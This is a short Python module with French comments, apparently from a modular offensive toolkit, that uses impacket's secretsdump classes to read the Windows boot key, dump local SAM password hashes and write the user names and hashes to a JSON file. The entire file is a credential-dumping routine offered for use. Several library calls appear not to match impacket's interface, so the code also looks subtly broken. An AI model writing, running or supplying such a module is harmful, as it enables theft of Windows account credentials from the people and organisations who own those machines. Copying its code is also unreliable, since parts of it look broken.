from impacket.examples.secretsdump import LocalOperations, SAMHashes
from core.utils import print_banner, save_output
def run():
    """
    Récupère les hashes d'utilisateurs locaux à partir du registre Windows.
    Nécessite un accès local (non distant).
    """
    print_banner("Module : Dump Local Credentials")
    try:
        # Accès aux clés de registre (SYSTEM et SAM) en local
        local_ops = LocalOperations()
        boot_key = local_ops.getBootKey()

        # Chargement des hachages SAM
        sam = SAMHashes(samFileName=None, bootKey=boot_key, isRemote=False)
        sam.dump()
        creds = sam.getHashes()

        # Formatage de la sortie
        output = [{"user": user, "hash": hash_value} for user, hash_value in creds]
        # Enregistrement dans un fichier JSON
        output_path = save_output(output, "credentials")
        print(f"[OK] Dump enregistré dans : {output_path}")

        sam.finish()
    except Exception as e:
        print(f"[ERREUR] Impossible d'extraire les credentials : {e}")